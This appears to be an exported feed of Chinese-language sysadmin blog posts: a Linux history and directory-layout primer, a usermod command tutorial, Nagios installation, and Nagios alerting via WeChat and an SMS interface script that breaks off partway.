    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F1.%20Linux%20%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[Linux 简介Linux 简史&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux 操作系统的诞生、发展和成长过程始终依赖着五个重要支柱：UNIX 操作系统、MINIX 操作系统、GNU计划、POSIX 标准和Internet 网络。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1981 年IBM公司推出微型计算机IBM PC。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1991年，GNU计划已经开发出了许多工具软件，最受期盼的GNU C编译器已经出现，GNU的操作系统核心HURD一直处于实验阶段，没有任何可用性，实质上也没能开发出完整的GNU操作系统，但是GNU奠定了Linux用户基础和开发环境。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1991年初，林纳斯·托瓦兹开始在一台386sx兼容微机上学习minix操作系统。1991年4月，林纳斯·托瓦兹开始酝酿并着手编制自己的操作系统。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1991 年4 月13 日在comp.os.minix 上发布说自己已经成功地将bash 移植到了minix 上，而且已经爱不释手、不能离开这个shell软件了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1991年7月3日，第一个与Linux有关的消息是在comp.os.minix上发布的（当然此时还不存在Linux这个名称，当时林纳斯·托瓦兹的脑子里想的可能是FREAX，FREAX的英文含义是怪诞的、怪物、异想天开等）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1991年的10月5日，林纳斯·托瓦兹在comp.os.minix新闻组上发布消息，正式向外宣布Linux内核的诞生（Freeminix-like kernel sources for 386-AT）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1993年，大约有100余名程序员参与了Linux内核代码编写/修改工作，其中核心组由5人组成，此时Linux 0.99的代码大约有十万行，用户大约有10万左右。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1994年3月，Linux1.0发布，代码量17万行，当时是按照完全自由免费的协议发布，随后正式采用GPL协议。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1995年1月，Bob Young创办了RedHat（小红帽），以GNU/Linux为核心，集成了400多个源代码开放的程序模块，搞出了一种冠以品牌的Linux，即RedHat Linux,称为Linux”发行版”，在市场上出售。这在经营模式上是一种创举。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1996年6月，Linux 2.0内核发布，此内核有大约40万行代码，并可以支持多个处理器。此时的Linux 已经进入了实用阶段，全球大约有350万人使用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1998年2月，以Eric Raymond为首的一批年轻的”老牛羚骨干分子”终于认识到GNU/Linux体系的产业化道路的本质，并非是什么自由哲学，而是市场竞争的驱动，创办了”Open Source Intiative”（开放源代码促进会）”复兴”的大旗，在互联网世界里展开了一场历史性的Linux产业化运动。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2001年1月，Linux 2.4发布，它进一步地提升了SMP系统的扩展性，同时它也集成了很多用于支持桌面系统的特性：USB，PC卡（PCMCIA）的支持，内置的即插即用，等等功能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2003年12月，Linux 2.6版内核发布，相对于2.4版内核2.6在对系统的支持都有很大的变化。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2004年的第1月，SuSE嫁到了Novell，SCO继续顶着骂名四处强行“化缘”， Asianux， MandrakeSoft也在五年中首次宣布季度赢利。3月，SGI宣布成功实现了Linux操作系统支持256个Itanium 2处理器。 主要特性基本思想&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux的基本思想有两点：第一，一切都是文件；第二，每个软件都有确定的用途。其中第一条详细来讲就是系统中的所有都归结为一个文件，包括命令、硬件和软件设备、操作系统、进程等等对于操作系统内核而言，都被视为拥有各自特性或类型的文件。至于说Linux是基于Unix的，很大程度上也是因为这两者的基本思想十分相近。 完全免费&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux是一款免费的操作系统，用户可以通过网络或其他途径免费获得，并可以任意修改其源代码。这是其他的操作系统所做不到的。正是由于这一点，来自全世界的无数程序员参与了Linux的修改、编写工作，程序员可以根据自己的兴趣和灵感对其进行改变，这让Linux吸收了无数程序员的精华，不断壮大。 完全兼容POSIX1.0标准&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这使得可以在Linux下通过相应的模拟器运行常见的DOS、Windows的程序。这为用户从Windows转到Linux奠定了基础。许多用户在考虑使用Linux时，就想到以前在Windows下常见的程序是否能正常运行，这一点就消除了他们的疑虑。 多用户、多任务&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux支持多用户，各个用户对于自己的文件设备有自己特殊的权利，保证了各用户之间互不影响。多任务则是现在电脑最主要的一个特点，Linux可以使多个程序同时并独立地运行。 良好的界面&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux同时具有字符界面和图形界面。在字符界面用户可以通过键盘输入相应的指令来进行操作。它同时也提供了类似Windows图形界面的X-Window系统，用户可以使用鼠标对其进行操作。在X-Window环境中就和在Windows中相似，可以说是一个Linux版的Windows。 支持多种平台&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux可以运行在多种硬件平台上，如具有x86、680x0、SPARC、Alpha等处理器的平台。此外Linux还是一种嵌入式操作系统，可以运行在掌上电脑、机顶盒或游戏机上。2001年1月份发布的Linux 2.4版内核已经能够完全支持Intel 64位芯片架构。同时Linux也支持多处理器技术。多个处理器同时工作，使系统性能大大提高。 桌面环境介绍&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在图形计算中，一个桌面环境（Desktop environment，有时称为桌面管理器）为计算机提供一个图形用户界面（GUI）。但严格来说窗口管理器和桌面环境是有区别的。桌面环境就是桌面图形环境，它的主要目标是为Linux/Unix操作系统提供一个更加完备 的界面以及大量各类整合工具和使用 程序，其基本 易用性吸引着大量的新用户。桌面环境名称来自桌面比拟，对应于早期的文字命令行界面（CLI）。一个典型的桌面环境提供图标，视窗，工具栏，文件夹，壁纸以及像拖放这样的能力。整体而言，桌面环境在设计和功能上的特性，赋予了它与众不同的外观和感觉。 种类&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现今主流的桌面环境有KDE，gnome，Xfce，LXDE等，除此之外还有Ambient，EDE，IRIX Interactive Desktop，Mezzo，Sugar，CDE等。 gnome&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;即GNU网络对象模型环境 (The GNU Network Object Model Environment)，GNU计划的一部分，开放源码运动的一个重要组成部分。是一种让使用者容易操作和设定电脑环境的工具。目标是基于自由软件，为Unix或者类Unix操作系统构造一个功能完善、操作简单以及界面友好的桌面环境，他是GNU计划的正式桌面。 Xfce&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;即XForms Common Environment，创建于2007年7月，类似于商业图形环境CDE，是一个运行在各类Unix下的轻量级桌面环境。原作者Olivier Fourdan最先设计XFce是基于XForms三维图形库。Xfce设计目的是用来提高系统的效率，在节省系统资源的同时，能够快速加载和执行应用程序。 Fluxbox&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是一个基于GNU/Linux的轻量级图形操作界面，它虽然没有GNOME和KDE那样精致 ，但由于它的运行对系统资源和配置要求极低，所以它被安装到很多较旧的或是对性能要求较高的机器上，其菜单和有关 配置被保存于用户根目录下的.fluxbox目录里，这样使得它的配置极为便利。 Enlightenment&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是一个功能强大的窗口管理器，它的目标是运用 户轻而易举地配置所见即所得的桌面图形界面。现在Enlightenment的界面已经相当豪华,它拥有像AfterStep一样的可视化时钟以及其它浮华的界面效果，用户不仅可以任意选择边框和动感的声音效果，最有吸引力的是由于它开放的设计思想，每一个用户可以根据自己的爱好，任意地配置窗口的边框、菜单以及屏幕上其它各个部分，而不须要 接触源代码，也不须要 编译任何程序。 文件系统文件类型&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;普通文件（regular file）：就是一般存取的文件，由ls -al显示出来的属性中，第一个属性为 [-]，例如 [-rwxrwxrwx]。另外，依照文件的内容，又大致可以分为： 纯文本文件（ASCII）：这是Unix系统中最多的一种文件类型，之所以称为纯文本文件，是因为内容可以直接读到的数据，例如数字、字母等等。设 置文件几乎都属于这种文件类型。举例来说，使用命令“cat ~/.bashrc”就可以看到该文件的内容（cat是将文件内容读出来）。 二进制文件（binary）：系统其实仅认识且可以执行二进制文件（binary file）。Linux中的可执行文件（脚本，文本方式的批处理文件不算）就是这种格式的。举例来说，命令cat就是一个二进制文件。 数据格式的文件（data）：有些程序在运行过程中，会读取某些特定格式的文件，那些特定格式的文件可以称为数据文件（data file）。举例来说，Linux在用户登入时，都会将登录数据记录在 /var/log/wtmp文件内，该文件是一个数据文件，它能通过last命令读出来。但使用cat时，会读出乱码。因为它是属于一种特殊格式的文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;目录文件（directory）：就是目录，第一个属性为 [d]，例如 [drwxrwxrwx]。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;连接文件（link）：类似Windows下面的快捷方式。第一个属性为 [l]，例如 [lrwxrwxrwx]。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设备与设备文件（device）：与系统外设及存储等相关的一些文件，通常都集中在 /dev目录。通常又分为两种： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;块设备文件：就是存储数据以供系统存取的接口设备，简单而言就是硬盘。例如一号硬盘的代码是 /dev/hda1等文件。第一个属性为 [b]。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;字符设备文件：即串行端口的接口设备，例如键盘、鼠标等等。第一个属性为 [c]。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;套接字（sockets）：这类文件通常用在网络数据连接。可以启动一个程序来监听客户端的要求，客户端就可以通过套接字来进行数据通信。第一个属性为 [s]，最常在 /var/run目录中看到这种文件类型。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;管道（FIFO,pipe）：FIFO也是一种特殊的文件类型，它主要的目的是，解决多个程序同时存取一个文件所造成的错误。FIFO是first-in-first-out（先进先出）的缩写。第一个属性为 [p]。 文件结构&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/：根目录，所有的目录、文件、设备都在/之下，/就是Linux文件系统的组织者，也是最上级的领导者。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/bin：bin 就是二进制（binary）英文缩写。在一般的系统当中，都可以在这个目录下找到linux常用的命令。系统所需要的那些命令位于此目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/boot：Linux的内核及引导系统程序所需要的文件目录，比如 vmlinuz initrd.img 文件都位于这个目录中。在一般情况下，GRUB或LILO系统引导管理器也位于这个目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/cdrom：这个目录在刚刚安装系统的时候是空的。可以将光驱文件系统挂在这个目录下。例如：mount /dev/cdrom /cdrom &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/dev：dev 是设备（device)的英文缩写。这个目录对所有的用户都十分重要。因为在这个目录中包含了所有linux系统中使用的外部设备。但是这里并不是放的外部设备的驱动程序。这一点和常用的windows,dos操作系统不一样。它实际上是一个访问这些外部设备的端口。可以非常方便地去访问这些外部设备，和访问一个文件，一个目录没有任何区别。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc：etc这个目录是linux系统中最重要的目录之一。在这个目录下存放了系统管理时要用到的各种配置文件和子目录。要用到的网络配置文件，文件系统，x系统配置文件，设备配置信息，设置用户信息等都在这个目录下。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/home：如果建立一个用户，用户名是”xx”,那么在/home目录下就有一个对应的/home/xx路径，用来存放用户的主目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/lib：lib是库（library）英文缩写。这个目录是用来存放系统动态连接共享库的。几乎所有的应用程序都会用到这个目录下的共享库。因此，千万不要轻易对这个目录进行什么操作，一旦发生问题，系统就不能工作了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/lost+found：在ext2或ext3文件系统中，当系统意外崩溃或机器意外关机，而产生一些文件碎片放在这里。当系统启动的过程中fsck工具会检查这里，并修复已经损坏的文件系统。有时系统发生问题，有很多的文件被移到这个目录中，可能会用手工的方式来修复，或移到文件到原来的位置上。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/mnt：这个目录一般是用于存放挂载储存设备的挂载目录的，比如有cdrom等目录。可以参看/etc/fstab的定义。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/media：有些linux的发行版使用这个目录来挂载那些usb接口的移动硬盘（包括U盘）、CD/DVD驱动器等等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/opt：这里主要存放那些可选的程序。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/proc：可以在这个目录下获取系统信息。这些信息是在内存中，由系统自己产生的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/root：Linux超级权限用户root的家目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/sbin：这个目录是用来存放系统管理员的系统管理程序。大多是涉及系统管理的命令的存放，是超级权限用户root的可执行命令存放地，普通用户无权限执行这个目录下的命令，这个目录和/usr/sbin; /usr/X11R6/sbin或/usr/local/sbin目录是相似的，凡是目录sbin中包含的都是root权限才能执行的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/selinux ：对SElinux的一些配置文件目录，SElinux可以让linux更加安全。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/srv 服务启动后，所需访问的数据目录，举个例子来说，www服务启动读取的网页数据就可以放在/srv/www中 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/tmp：临时文件目录，用来存放不同程序执行时产生的临时文件。有时用户运行程序的时候，会产生临时文件。/tmp就用来存放临时文件的。/var/tmp目录和这个目录相似。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/usr：这是linux系统中占用硬盘空间最大的目录。用户的很多应用程序和文件都存放在这个目录下。在这个目录下，可以找到那些不适合放在/bin或/etc目录下的额外的工具 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/usr/local：这里主要存放那些手动安装的软件，即不是通过“新立得”或apt-get安装的软件。它和/usr目录具有相类似的目录结构。让软件包管理器来管理/usr目录，而把自定义的脚本（scripts)放到/usr/local目录下面。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/usr/share ：系统共用的东西存放地，比如 /usr/share/fonts 是字体目录，/usr/share/doc和/usr/share/man帮助文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/var：这个目录的内容是经常变动的，看名字就知道，可以理解为vary的缩写，/var下有/var/log 这是用来存放系统日志的目录。/var/ www目录是定义Apache服务器站点存放目录；/var/lib 用来存放一些库文件，比如MySQL的，以及MySQL数据库的的存放地。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 修改用户属性]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F11.%20Linux%20usermod%20%E4%BF%AE%E6%94%B9%E7%94%A8%E6%88%B7%E5%B1%9E%E6%80%A7%2F</url>
    <content type="text"><![CDATA[Linux 修改用户属性&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;usermod 命令修改系统帐户文件来反映通过命令行指定的变化 选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-a|–append&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;##把用户追加到某些组中，仅与-G选项一起使用 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-c|–comment&#160;&#160;&#160;&#160;&#160;&#160;&#160;##修改/etc/passwd文件第五段comment &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-d|–home&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;##修改用户的家目录通常和-m选项一起使用 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-e|–expiredate&#160;&#160;&#160;&#160;&#160;&#160;##指定用户帐号禁用的日期，格式YY-MM-DD &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-f|–inactive&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ##用户密码过期多少天后采用就禁用该帐号，0表示密码已过期就禁用帐号，-1表示禁用此功能，默认值是-1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-g|–gid&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ##修改用户的gid，改组一定存在 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-G|–groups&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;##把用户追加到某些组中，仅与-a选项一起使用 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-l|–login&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;##修改用户的登录名称 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-L|–lock&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;##锁定用户的密码 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-m|–move-home&#160;&#160;&#160;##修改用户的家目录通常和-d选项一起使用 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-s|–shell&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;##修改用户的shell &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-u|–uid&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;##修改用户的uid，该uid必须唯一 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-U|–unlock&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;##解锁用户的密码 示例1.新建用户 test ，密码 test ，另外添加 usertest 组123#useradd test #echo "test" | passwd --stdin test #groupadd usertest 2.把 test 用户加入 usertest 组123#usermod -aG usertest test ##多个组之间用空格隔开 #id test uid=500(test) gid=500(test) groups=500(test),501(usertest) 3.修改 test 用户的家目录123#usermod -md /home/usertest #ls /home usertest 4.修改用户名123#usermod -l urchin(新用户名称) test(原来用户名称) #id urchin uid=500(urchin) gid=500(test) groups=500(test),501(usertest) 5.锁定 urchin 的密码1234567# sed -n '$p' /etc/shadow urchin:$6$1PwPVBn5$o.MIEYONzURQPvn/YqSp69kt2CIASvXhOnjv/t \Z5m4NN6bJyLjCG7S6vmji/PFDfbyITdm1WmtV45CfHV5vux/:15594:0:99999:7::: #usermod -L urchin # sed -n '$p' /etc/shadow urchin:!$6$1PwPVBn5$o.MIEYONzURQPvn/YqSp69kt2CIASvXhOnjv/t \Z5m4NN6bJyLjCG7S6vmji/PFDfbyITdm1WmtV45CfHV5vux/:15594:0:99999:7::: 6.解锁 urchin 的密码1234#usermod -U urchin # sed -n '$p' /etc/shadow urchin:$6$1PwPVBn5$o.MIEYONzURQPvn/YqSp69kt2CIASvXhOnjv/t \ Z5m4NN6bJyLjCG7S6vmji/PFDfbyITdm1WmtV45CfHV5vux/:15594:0:99999:7::: 7.修改用户的 shell12345#sed '$!d' /etc/passwd urchin:x:500:500::/home/usertest:/bin/bash #usermod -s /bin/sh urchin #sed -n '$p' /etc/passwd urchin:x:500:500::/home/usertest:/bin/sh 8.修改用户的 UID123#usermod -u 578 urchin (UID必须唯一) #id urchin uid=578(urchin) gid=500(test) groups=500(test),501(usertest) 9.修改用户的 GID1234#groupadd -g 578 test1 #usermod -g 578 urchin (578组一定要存在) #id urchin uid=578(urchin) gid=578(test1) groups=578(test1),501(usertest) 10.指定帐号过期日期1234567# sed -n '$p' /etc/shadow urchin:$6$1PwPVBn5$o.MIEYONzURQPvn/YqSp69kt2CIASvXhOnjv/t \ Z5m4NN6bJyLjCG7S6vmji/PFDfbyITdm1WmtV45CfHV5vux/:15594:0:99999:7::: # usermod -e 2012-09-11 urchin # sed -n '$p' /etc/shadow urchin:$6$1PwPVBn5$o.MIEYONzURQPvn/YqSp69kt2CIASvXhOnjv/t \ Z5m4NN6bJyLjCG7S6vmji/PFDfbyITdm1WmtV45CfHV5vux/:15594:0:99999:7::15594: 11.指定用户帐号密码过期多少天后，禁用该帐号1234# usermod -f 0 urchin # sed -n '$p' /etc/shadow urchin:$6$1PwPVBn5$o.MIEYONzURQPvn/YqSp69kt2CIASvXhOnjv/t \ Z5m4NN6bJyLjCG7S6vmji/PFDfbyITdm1WmtV45CfHV5vux/:15594:0:99999:7:0:15594: 注意&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;usermod 不允许改变正在线上的使用者帐号名称。当 usermod 用来改变 userID ,必须确认这名 user 没在电脑上执行任何程序 /etc/passwduser_name:x:uid:gid:commnet:home:shell /etc/shadowusername:passwd:lastchg:min:max:warn:inactive:expire:flag–用户名–密码–从1970年1月1日起到上次修改密码所经过的天数–密码再过几天可以被变更(0表示随时可以改变)–密码再过几天必须被变更(99999表示永不过期)–密码过期前几天提醒用户(默认为一周)–密码过期几天后帐号被禁用–从1970年1月1日算起，多少天后账号失效]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nagios整合微信订阅号报警]]></title>
    <url>%2F2017%2F08%2F14%2FNagios%2F4.%20Nagios%E6%95%B4%E5%90%88%E5%BE%AE%E4%BF%A1%E8%AE%A2%E9%98%85%E5%8F%B7%E6%8A%A5%E8%AD%A6%2F</url>
    <content type="text"><![CDATA[Nagios整合微信订阅号报警&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;环境：rhel6.5 selinux 和 iptables 关闭。要求能上外网的（虚拟机亲测可用） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下是nagios服务与微信订阅号的整合过程，最终实现当服务或主机出现故障，自动调用微信报警。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重点讲述如何配置微信公众平台私有接口，至于nagios服务的配置请大家参照nagios官方文档进行，此处不再赘述。（www.nagios.org） 1.下载微信公众平台私有接口12yum install -y gitgit clone https://github.com/lealife/WeiXin-Private-API 2.修改微信公众平台私有接口代码，以配合nagios报警123cp -r WeiXin-Private-API /usr/local/nagios/libexec/weixinchown -R nagios.nagios /usr/local/nagios/libexec/weixincd /usr/local/nagios/libexec/weixin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改config.php文件： 12345$G_CONFIG["weiXin"] = array( 'account' =&gt; '微信公众平台登录帐号',#填写你注册的微信订阅号的帐号和密码 'password' =&gt; '微信公众平台登录密码', &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改test.php文件,只保留如下几行即可： 1234567891011&lt;?phprequire "config.php";require "include/WeiXin.php";$weiXin = new WeiXin($G_CONFIG['weiXin']);$testFakeId = "$argv[1]";#微信好友ID号，这里通过nagios传入$msg = `cat /usr/local/nagios/var/nagios.msg`;#要发送的报警信息，由nagios传入print_r($weiXin-&gt;send($testFakeId, "$msg"));#给微信好友发送信息 3.整合nagios和微信公共平台私有接口增加微信报警选项: templates.cfg&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改 /usr/local/nagios/etc/objects/templates.cfg &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 define contact{…} 部分,将以下两行: 12host_notification_commands notify-host-by-emailservice_notification_commands notify-service-by-email &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;改为: 12host_notification_commands notify-host-by-email,notify-host-by-weixinservice_notification_commands notify-service-by-email,notify-service-by-weixin 增加调用命令: commands.cfg&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改 /usr/local/nagios/etc/objects/commands.cfg &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在该文件的最后增加以下部分: 1234567891011 ####notify-service-by-weixindefine command&#123; command_name notify-service-by-weixin command_line /usr/bin/printf "%b" "***** Nagios *****\n\nNotification Type: $NOTIFICATIONTYPE$\nHost: $HOSTNAME$\nState: $HOSTSTATE$\nAddress: $HOSTADDRESS$\nInfo: $HOSTOUTPUT$\n\nDate/Time: $LONGDATETIME$\n" &gt; /usr/local/nagios/var/nagios.msg &amp;&amp; /usr/bin/php /usr/local/nagios/libexec/weixin/test.php $CONTACTADDRESS1$ &amp;&gt;/dev/null &#125; ####notify-host-by-weixin define command&#123; command_name notify-host-by-weixin command_line /usr/bin/printf "%b" "***** Nagios *****\n\nNotification Type: $NOTIFICATIONTYPE$\nHost: $HOSTNAME$\nState: $HOSTSTATE$\nAddress: $HOSTADDRESS$\nInfo: $HOSTOUTPUT$\n\nDate/Time: $LONGDATETIME$\n" &gt; /usr/local/nagios/var/nagios.msg &amp;&amp; /usr/bin/php /usr/local/nagios/libexec/weixin/test.php $CONTACTADDRESS1$ &amp;&gt;/dev/null &#125; 修改联系人选项: contact.cfg&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改 /usr/local/nagios/etc/objects/contact.cfg &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 define contact{…} 部分增加如下一行 1address 11206***#微信好友ID，登录微信公众平台网页版，在用户管理中点击你要发微信的好友，此时在地址上显示的fakeid就是微信好友的ID。 重载nagios配置1service nagios reload]]></content>
      <tags>
        <tag>Nagios</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nagios安装]]></title>
    <url>%2F2017%2F08%2F14%2FNagios%2F1.%20Nagios%20%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[nagios 安装配置(yum安装)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Nagios官网 1.nagios 简介&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nagios 是一个开源软件，可以监控网络设备网络流量、linux/windows 主机状态，甚至可以监控打印机。它可以运行在 linux 上或 windows 上。基于浏览器的 web 界面方便运维人员查看监控项目的状态，支持 web 界面配置、管理操作、支持短信、邮件通知，可以自定义脚本实现自定义化监控。 2.nagios 安装 - 服务端（192.168.0.62）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先来安装服务器，nagios 同样也是需要 apache + php 的环境，centos 6 默认的 yum 源里没有 nagios 相关的 rpm 包，需要安装一个 epel 的扩展源。 1[root@nagios ~]# yum install -y epel-release &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后安装 nagios 相关的包 1[root@nagios ~]# yum install -y httpd nagios nagios-plugins nagios-plugins-all nrpe nagios-plugins-nrpe &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置登录 nagios 后台的用户和密码： 1234[root@nagios ~]# htpasswd -c /etc/nagios/passwd nagiosadminNew password: Re-type new password: Adding password for user nagiosadmin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检查配置文件是否有问题 1[root@nagios ~]# nagios -v /etc/nagios/nagios.cfg &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明配置文件没有问题 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动服务 12[root@nagios ~]# service httpd start[root@nagios ~]# service nagios start &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;浏览器访问 http://ip/nagios &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输入设置的帐号密码登录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此时，nagios 监控的只有 localhost ，还没有其他机器，要想添加监控客户机，还需要在客户端安装 nagios 相关的软件包，并且需要在服务端配置。]]></content>
      <tags>
        <tag>Nagios</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nagios调用短信接口]]></title>
    <url>%2F2017%2F08%2F14%2FNagios%2F5.%20nagios%E8%B0%83%E7%94%A8%E7%9F%AD%E4%BF%A1%E6%8E%A5%E5%8F%A3%2F</url>
    <content type="text"><![CDATA[nagios调用短信接口&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;公司正好有自己的短信接口平台，接下来带大家一起配置nagios调用第三方短信接口。 首先我们要写一个调用短信接口的脚本，网上的脚本大都是python写的，我这个是shell写的，比较好理解。 1vi /root/duanxin.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 脚本的日志文件 12345678910111213141516171819LOGFILE="/data1/sms_log/sms_send_.log" #定义发送短信的日志信息 文件:&gt;&gt;"$LOGFILE" exec 1&gt;&gt;"$LOGFILE" exec 2&gt;&amp;1 Uid="test" #接口的用户名，这个使用接口时对方会提供，我这里的test是随意写的Key="123456" #密码与用户名对应，也是接口方提供MOBILE_NUMBER=$1 # 接受短信的手机号码 QIANMING="%e3%80%90%e9%a9%ac%e5%8f%af%e6%b3%a2%e7%bd%97%e7%bd%91%e3%80%91" #这里重点说一下，签名有的接口需要，有的不需要，因为我们公司的接口需要，所以需要添加上，我这里的签名内容是经过编码的，不加编码会导致发送失败，具体工作中需不需要编码还得看接口哪边有没有要求。XXD="/usr/bin/xxd" CURL="/usr/bin/curl" TIMEOUT=5 MESSAGE_ENCODE=$(echo $(/usr/local/bin/php -r "echo urlencode(\"$2\");"; ) ) 